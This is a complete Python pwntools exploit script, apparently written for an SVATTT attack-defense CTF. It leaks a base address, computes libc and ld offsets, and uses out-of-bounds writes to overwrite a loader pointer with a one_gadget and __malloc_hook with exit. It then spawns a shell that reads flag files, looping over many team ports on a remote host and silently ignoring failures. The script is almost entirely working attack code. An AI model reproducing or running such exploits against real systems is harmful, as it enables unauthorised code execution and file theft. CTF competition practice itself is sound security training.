#!/usr/bin/env python3

from pwn import *

def write(offset, val):
    r.sendlineafter('offset:', offset)
    r.sendlineafter('value:', val)

def exploit():
    r.sendlineafter('Size:', str(10000000))
    r.recvuntil('Magic:')
    raw = r.recvline()
    base = int(raw, 16)
    libc = base + 0x989ff0
    one_gadget = libc + 0x4f322
    malloc_hook = libc + 0x3ebc30
    ld = libc + 0x3f1000
    magic = ld + 0x228f68
    exit_addr = 0x43120 + libc
    
    offset = (magic - base) // 8
    write(str(offset), str(one_gadget))
    offset = (malloc_hook - base) // 8 
    write(str(offset), str(exit_addr))
    
    write('1', '1'*0x1000)
    r.sendline('cat /*/*/fl*')
    log.success(r.recvline().decode('latin1'))

for port in range(1085, 18085, 1000):
    if port == 5085 or port == 16085:
        continue

    print('Attacking {}'.format(port))

    try:
        with remote('services.svattt.com', port, timeout=1) as r:
            exploit()
    except:
        pass
